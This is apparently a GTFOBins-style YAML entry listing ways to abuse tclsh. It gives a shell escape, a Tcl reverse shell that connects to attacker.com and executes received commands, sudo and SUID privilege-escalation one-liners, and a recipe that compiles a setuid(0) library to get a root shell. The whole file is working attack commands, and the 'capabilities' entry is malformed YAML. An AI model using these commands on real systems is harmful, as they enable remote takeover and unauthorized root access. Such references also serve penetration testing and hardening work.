---
functions:
  shell:
    - code: |
        tclsh
        exec /bin/sh <@stdin >@stdout 2>@stderr
  non-interactive-reverse-shell:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
  suid:
    - code: |
        ./tclsh
        exec /bin/sh -p <@stdin >@stdout 2>@stderr
  sudo:
    - code: |
        sudo tclsh
        exec /bin/sh <@stdin >@stdout 2>@stderr
  capabilities
   - code: |
        echo -e '#include <tcl.h>\n#include <unistd.h>\nint SetUidCmd(ClientData, Tcl_Interp *interp, int, const char **) { return setuid(0) == -1 ? (Tcl_SetResult(interp, "Failed to set UID", TCL_STATIC), TCL_ERROR) : TCL_OK; } int Setuid_Init(Tcl_Interp *interp) { Tcl_CreateCommand(interp, "setuid", SetUidCmd, NULL, NULL); return TCL_OK; }' | gcc -shared -o setuid.so -fPIC -I/usr/include/tcl8.6 -ltcl -x c -
        ./tclsh
        load ./setuid.so
        setuid
        exec /bin/sh -p <@stdin >@stdout 2>@stderr
---
